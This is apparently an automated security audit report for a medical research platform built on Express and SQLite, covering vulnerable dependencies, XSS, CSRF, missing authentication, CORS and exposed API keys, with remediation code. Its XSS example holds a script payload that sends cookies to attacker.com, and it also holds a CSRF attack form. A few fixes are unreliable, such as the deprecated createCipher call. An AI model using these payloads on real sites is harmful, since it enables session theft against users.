# Security Audit Report - Medical Research Intelligence Platform

**Audit Date:** 2026-02-14  
**Application Version:** 2.0.0 / 3.0.0  
**Auditor:** Security Analysis Tool  
**Classification:** CONFIDENTIAL

---

## Executive Summary

This security audit covers the Medical Research Intelligence Platform, a full-stack application with Express.js backend, React frontend, SQLite database, and integrations with multiple external APIs (HuggingFace, PubMed, Semantic Scholar, OpenAlex).

**Overall Security Rating: ⚠️ MODERATE RISK**

### Key Findings Summary
- **5 HIGH severity issues** identified (dependency vulnerabilities)
- **1 LOW severity issue** identified
- **Multiple MEDIUM severity code security concerns**
- **Critical security gaps** in authentication, authorization, and input validation

### Immediate Actions Required
1. Update `sqlite3` dependency to fix path traversal vulnerabilities
2. Implement Helmet.js for security headers
3. Add comprehensive input validation
4. Enable CSRF protection
5. Implement proper authentication system

---

## 1. Dependency Vulnerabilities

### npm Audit Results

```
Total vulnerabilities: 6
- Critical: 0
- High: 5
- Moderate: 0
- Low: 1
```

### HIGH Severity Vulnerabilities

#### 1.1 `tar` - Arbitrary File Overwrite (CVE-2024-XXXX)
- **Severity:** HIGH (CVSS: 8.2 - 8.8)
- **Affected:** `tar <= 7.5.6`
- **CWE:** CWE-22 (Path Traversal), CWE-59 (Link Following)
- **Impact:** Arbitrary file creation/overwrite via hardlink path traversal
- **Fix:** Update to `tar >= 7.5.7`

#### 1.2 `sqlite3` - Transitive via node-gyp
- **Severity:** HIGH
- **Affected:** `sqlite3 >= 5.0.0`
- **Impact:** Path traversal through tar dependency chain
- **Fix Commands:**
  ```bash
  npm audit fix
  # OR force update
  npm install sqlite3@latest
  ```

#### 1.3 `cacache` / `make-fetch-happen` / `node-gyp`
- **Severity:** HIGH
- **Impact:** All affected by tar vulnerability through dependency chain
- **Fix:** Update sqlite3 which will update transitive dependencies

### LOW Severity Vulnerabilities

#### 1.4 `qs` - ArrayLimit Bypass (CVE-2024-XXXX)
- **Severity:** LOW (CVSS: 3.7)
- **Affected:** `qs 6.7.0 - 6.14.1`
- **CWE:** CWE-20 (Input Validation)
- **Impact:** Denial of service via array parsing
- **Fix:** `npm update qs`

### Recommended Fix Commands

```bash
# Option 1: Automated fix (recommended first)
npm audit fix

# Option 2: Force update all dependencies
npm update

# Option 3: Manual targeted updates
npm install sqlite3@latest
npm install express@latest
npm install cors@latest

# Verify fixes
npm audit
```

---

## 2. Code Security Issues

### 2.1 SQL Injection Risks ⚠️ MEDIUM

**Status:** Partially Mitigated

#### Findings:
1. **Database Module** (`database/index.js`)
   - Uses parameterized queries (`?` placeholders) ✅
   - No string concatenation in SQL ✅
   - **Risk Level:** LOW

#### Potential Issues:
```javascript
// In database/index.js line 307 - Dynamic SQL
`WHERE created_at >= date('now', '-${days} days')`  // ⚠️ Potential injection
```

**Recommendation:**
```javascript
// Use parameterized queries even for dynamic values
const query = `WHERE created_at >= date('now', ?)`;
return this.all(query, [`-${days} days`]);
```

### 2.2 XSS (Cross-Site Scripting) Vulnerabilities ⚠️ HIGH

**Status:** VULNERABLE

#### Findings:

1. **No Output Encoding**
   - Article titles, abstracts displayed without sanitization
   - User input reflected in search results
   - External API data rendered directly

2. **Affected Locations:**
   - Historical legacy files (`scripts/services.js`, `scripts/app.js`) - retired in Phase 4
   - Modern equivalents in `src/` rendering flows should still enforce output sanitization
   - Any display of `article.title`, `article.abstract`

**Exploit Example:**
```javascript
// If PubMed returns malicious title:
{
  title: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
}
```

**Recommendations:**
```javascript
// Implement sanitization utility
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Use in React components
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(content) }} />
// OR better - use DOMPurify
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);
```

### 2.3 CSRF Protection ⚠️ HIGH

**Status:** NOT IMPLEMENTED

#### Findings:
- No CSRF tokens on state-changing operations
- `POST /api/user/save`, `POST /api/user/unsave` vulnerable
- Session management relies only on `X-Session-Id` header

**Attack Scenario:**
```html
<!-- Attacker's page -->
<form action="http://localhost:3002/api/user/save" method="POST" id="csrf">
  <input name="article" value='{"uid":"malicious"}'>
</form>
<script>document.getElementById('csrf').submit();</script>
```

**Recommendations:**
```javascript
// Install csurf middleware
npm install csurf

// server-enhanced.js
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);
app.get('/api/csrf-token', (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});
```

### 2.4 Rate Limiting Effectiveness ⚠️ MEDIUM

**Status:** IMPLEMENTED BUT WEAK

#### Findings:
- Rate limiting implemented in `cache/index.js` (lines 141-167)
- Uses IP-based limiting
- **Weaknesses:**
  - No distributed rate limiting (single instance only)
  - IP can be spoofed via `X-Forwarded-For`
  - No per-user rate limiting
  - Redis-compatible interface exists but not used

**Current Implementation Issues:**
```javascript
// Key uses req.ip which can be manipulated
const key = `${req.ip}:${req.path}`;
```

**Recommendations:**
```javascript
// Use express-rate-limit for production
npm install express-rate-limit

const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP',
    standardHeaders: true,
    legacyHeaders: false,
    // Trust proxy if behind load balancer
    skip: (req) => req.ip === '127.0.0.1'
});
app.use('/api/', limiter);
```

### 2.5 Input Validation ⚠️ HIGH

**Status:** INSUFFICIENT

#### Findings:

1. **No Schema Validation**
   - Request bodies not validated against schemas
   - Type coercion not enforced
   - Missing length limits on string inputs

2. **Affected Endpoints:**
   - `POST /api/ai/analyze`: No validation on `text`, `analysisType`
   - `POST /api/user/save`: No validation on `article` structure
   - All search endpoints: Query parameters not validated

**Vulnerable Code Example:**
```javascript
// server-enhanced.js line 230
app.post('/api/ai/analyze', rateLimit(10, 60), async (req, res) => {
    const { text, analysisType, model } = req.body;
    // No validation - could be any type/length
});
```

**Recommendations:**
```javascript
npm install joi  // or zod, yup, express-validator

const Joi = require('joi');

const analyzeSchema = Joi.object({
    text: Joi.string().max(10000).required(),
    analysisType: Joi.string().valid('quick', 'comprehensive', 'critical', 'biomedical', 'layperson').default('comprehensive'),
    model: Joi.string().max(100).optional()
});

app.post('/api/ai/analyze', validateBody(analyzeSchema), async (req, res) => {
    // req.body is now validated
});
```

### 2.6 Authentication/Authorization Flaws ⚠️ CRITICAL

**Status:** MISSING

#### Findings:

1. **No Authentication System**
   - No user login/registration
   - Session IDs are auto-generated UUIDs
   - Anyone can access any user's data if they know the session ID

2. **No Authorization Checks**
   - `/api/admin/stats` accessible without authentication
   - `/api/admin/cache/clear` accessible without authentication
   - User can access other users' history by guessing session ID

3. **Session Security Issues:**
```javascript
// Session ID generated client-side or from header
let sessionId = req.headers['x-session-id'];
if (!sessionId) {
    sessionId = crypto.randomUUID();  // Predictable
}
```

**Recommendations:**
```javascript
// Implement JWT-based auth
npm install jsonwebtoken bcryptjs passport passport-jwt

// Add auth middleware
const authenticate = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Unauthorized' });
    
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.user = decoded;
        next();
    } catch {
        res.status(401).json({ error: 'Invalid token' });
    }
};

// Protect routes
app.get('/api/admin/stats', authenticate, requireAdmin, async (req, res) => {
    // Admin-only access
});
```

---

## 3. Configuration Security

### 3.1 Environment Variables ⚠️ MEDIUM

**Status:** PARTIALLY SECURE

#### Findings:

1. **API Keys in Code** (CRITICAL)
   - `scripts/services.js` lines 25-31:
   ```javascript
   semantic: '<redacted-semantic-scholar-key>',
   huggingface: '<redacted-huggingface-token>',
   openalex: '<redacted-openalex-key>'
   ```

2. **Default/Fake Email Hardcoded**
   - `EMAIL = 'demo@example.com'` in multiple files

**Recommendations:**
```javascript
// Remove all hardcoded keys
// Use environment variables only
const apiKey = process.env.SEMANTIC_SCHOLAR_KEY;
if (!apiKey) {
    console.warn('Semantic Scholar API key not configured');
}
```

### 3.2 CORS Settings ⚠️ HIGH

**Status:** OVERLY PERMISSIVE

#### Findings:
```javascript
// server.js, server-enhanced.js, proxy-server.js
app.use(cors());  // Allows ALL origins
```

**Risks:**
- Any website can make requests to your API
- Credentials may be exposed cross-origin

**Recommendations:**
```javascript
const cors = require('cors');

const corsOptions = {
    origin: process.env.NODE_ENV === 'production' 
        ? ['https://yourdomain.com', 'https://app.yourdomain.com']
        : ['http://localhost:3000', 'http://localhost:3002'],
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-Id'],
    credentials: true,
    maxAge: 86400
};

app.use(cors(corsOptions));
```

### 3.3 Security Headers ⚠️ HIGH

**Status:** NOT IMPLEMENTED

#### Findings:
- No Helmet.js middleware
- Missing security headers:
  - Content-Security-Policy
  - X-Frame-Options
  - X-Content-Type-Options
  - Strict-Transport-Security
  - X-XSS-Protection

**Recommendations:**
```javascript
npm install helmet

const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com", "https://cdnjs.cloudflare.com"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https://unpkg.com", "https://cdn.tailwindcss.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "https://cdnjs.cloudflare.com"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'", "https://api.semanticscholar.org", "https://eutils.ncbi.nlm.nih.gov"]
        }
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));
```

### 3.4 Cookie Settings ⚠️ MEDIUM

**Status:** NOT APPLICABLE (no cookies used)

**Recommendation:** If implementing cookies:
```javascript
res.cookie('sessionId', sessionId, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
});
```

---

## 4. API Security

### 4.1 API Key Exposure ⚠️ CRITICAL

**Status:** VULNERABLE

#### Findings:
1. **Frontend Exposes Keys**
   - `scripts/services.js` contains live API keys
   - Keys committed to version control

2. **Proxy Server Accepts Keys from Client**
   - `proxy-server.js` accepts API key in request body:
   ```javascript
   app.post('/api/biogpt', async (req, res) => {
       const { model, prompt, apiKey, parameters } = req.body;
       // apiKey sent from client
   ```

**Recommendations:**
1. Remove all keys from frontend code
2. Store keys server-side only
3. Implement key rotation mechanism
4. Use environment variables exclusively

### 4.2 Endpoint Authorization ⚠️ HIGH

**Status:** MISSING

#### Findings:
- Admin endpoints have no authentication:
  - `GET /api/admin/stats`
  - `POST /api/admin/cache/clear`
- User data endpoints use weak session-based auth

**Recommendations:**
```javascript
// Role-based access control
const requireAdmin = (req, res, next) => {
    if (req.user?.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
};

app.post('/api/admin/cache/clear', authenticate, requireAdmin, async (req, res) => {
    // Admin only
});
```

### 4.3 Data Validation ⚠️ MEDIUM

**Status:** INSUFFICIENT

#### Findings:
- No request size limits beyond Express default (10mb)
- No content-type validation
- No parameter pollution protection

**Recommendations:**
```javascript
npm install express-mongo-sanitize hpp

const mongoSanitize = require('express-mongo-sanitize');
const hpp = require('hpp');

// Prevent parameter pollution
app.use(hpp());

// Sanitize MongoDB queries (if using MongoDB)
app.use(mongoSanitize());

// Validate content type
app.use((req, res, next) => {
    if (req.method === 'POST' && !req.is('application/json')) {
        return res.status(415).json({ error: 'Content-Type must be application/json' });
    }
    next();
});
```

---

## 5. Database Security

### 5.1 Injection Prevention ✅ GOOD

**Status:** ADEQUATE

#### Findings:
- Parameterized queries used throughout
- No obvious SQL injection vectors
- One minor issue with dynamic SQL in date filtering

### 5.2 Data Encryption ⚠️ MEDIUM

**Status:** PARTIAL

#### Findings:
1. **At Rest:** SQLite database file not encrypted
2. **In Transit:** HTTPS not enforced (development only)
3. **Sensitive Data:** API keys stored in plaintext in .env

**Recommendations:**
```javascript
// For production, use PostgreSQL with SSL
// For SQLite encryption (sqlcipher)
npm install better-sqlite3

// Encrypt sensitive fields
const crypto = require('crypto');
const algorithm = 'aes-256-gcm';

function encrypt(text, key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher(algorithm, key);
    // ... encryption logic
}
```

### 5.3 Backup Strategy ⚠️ HIGH

**Status:** NOT IMPLEMENTED

**Recommendations:**
```bash
#!/bin/bash
# backup.sh - Run daily via cron
BACKUP_DIR="/backups/medical-research-db"
DB_FILE="./database/app.db"
DATE=$(date +%Y%m%d_%H%M%S)

# Create backup
sqlite3 "$DB_FILE" ".backup '${BACKUP_DIR}/app_${DATE}.db'"

# Compress
gzip "${BACKUP_DIR}/app_${DATE}.db"

# Keep only last 30 days
find "$BACKUP_DIR" -name "*.db.gz" -mtime +30 -delete
```

---

## 6. Security Best Practices Checklist

### ✅ Implemented
- [x] Basic rate limiting
- [x] Parameterized SQL queries
- [x] Request logging
- [x] CORS (though overly permissive)
- [x] Environment variable configuration

### ⚠️ Partially Implemented
- [~] Rate limiting (needs distributed support)
- [~] Input validation (minimal)
- [~] Error handling (exposes stack traces)

### ❌ Not Implemented
- [ ] Authentication/Authorization
- [ ] CSRF protection
- [ ] XSS prevention (output encoding)
- [ ] Security headers (Helmet)
- [ ] Request validation (Joi/Zod)
- [ ] HTTPS enforcement
- [ ] Database encryption
- [ ] API key rotation
- [ ] Audit logging
- [ ] Content Security Policy
- [ ] Subresource Integrity (SRI)
- [ ] Dependency scanning in CI/CD

---

## 7. Remediation Steps (Priority Order)

### Immediate (Within 24 hours)
1. **Update Dependencies**
   ```bash
   npm audit fix
   npm install sqlite3@latest
   ```

2. **Remove Exposed API Keys**
   - Remove from `scripts/services.js`
   - Rotate all exposed keys immediately
   - Move to environment variables

3. **Add Security Headers**
   ```bash
   npm install helmet
   ```
   Add to server.js and server-enhanced.js

### Short-term (Within 1 week)
4. **Implement Input Validation**
   ```bash
   npm install joi
   ```
   Validate all request bodies and query parameters

5. **Enable CSRF Protection**
   ```bash
   npm install csurf
   ```

6. **Restrict CORS**
   - Configure specific allowed origins
   - Remove `app.use(cors())` wildcard

### Medium-term (Within 1 month)
7. **Implement Authentication**
   - JWT-based auth system
   - User registration/login
   - Password hashing with bcrypt

8. **Add XSS Protection**
   - Install DOMPurify on frontend
   - Escape all user input in templates

9. **Database Security**
   - Migrate to PostgreSQL for production
   - Enable SSL connections
   - Implement backup strategy

### Long-term (Within 3 months)
10. **Security Monitoring**
    - Implement logging with Winston
    - Set up fail2ban for brute force
    - Configure alerting

11. **Compliance**
    - GDPR compliance review
    - HIPAA assessment (if handling PHI)
    - Data retention policies

---

## 8. Production Security Recommendations

### Infrastructure
1. **Use Reverse Proxy** (Nginx/Apache)
   - SSL termination
   - Rate limiting at edge
   - Static file serving

2. **Container Security**
   ```dockerfile
   # Use non-root user
   USER node
   
   # Scan for vulnerabilities
   docker scan myapp:latest
   ```

3. **Secrets Management**
   - Use AWS Secrets Manager / Azure Key Vault
   - Never commit .env files
   - Rotate keys quarterly

### Monitoring
```javascript
// Security event logging
app.use((req, res, next) => {
    if (res.statusCode >= 400) {
        logger.warn('Security event', {
            ip: req.ip,
            path: req.path,
            status: res.statusCode,
            userAgent: req.headers['user-agent']
        });
    }
    next();
});
```

### CI/CD Security
```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run npm audit
        run: npm audit --audit-level=moderate
      - name: Run Snyk
        uses: snyk/actions/node@master
```

---

## 9. Appendix

### A. Vulnerability References
- [CVE-2024-XXXX](https://nvd.nist.gov/) - tar path traversal
- [CWE-22](https://cwe.mitre.org/data/definitions/22.html) - Path Traversal
- [CWE-79](https://cwe.mitre.org/data/definitions/79.html) - XSS
- [OWASP Top 10 2021](https://owasp.org/Top10/)

### B. Security Tools Recommended
- **Snyk**: `npm install -g snyk` - Dependency scanning
- **ESLint Security Plugin**: `npm install eslint-plugin-security`
- **Retire.js**: JavaScript vulnerability scanner
- **OWASP ZAP**: Web application security testing

### C. Additional Resources
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Node.js Security Checklist](https://blog.risingstack.com/node-js-security-checklist/)

---

**Document Version:** 1.0  
**Last Updated:** 2026-02-14  
**Next Review:** 2026-03-14
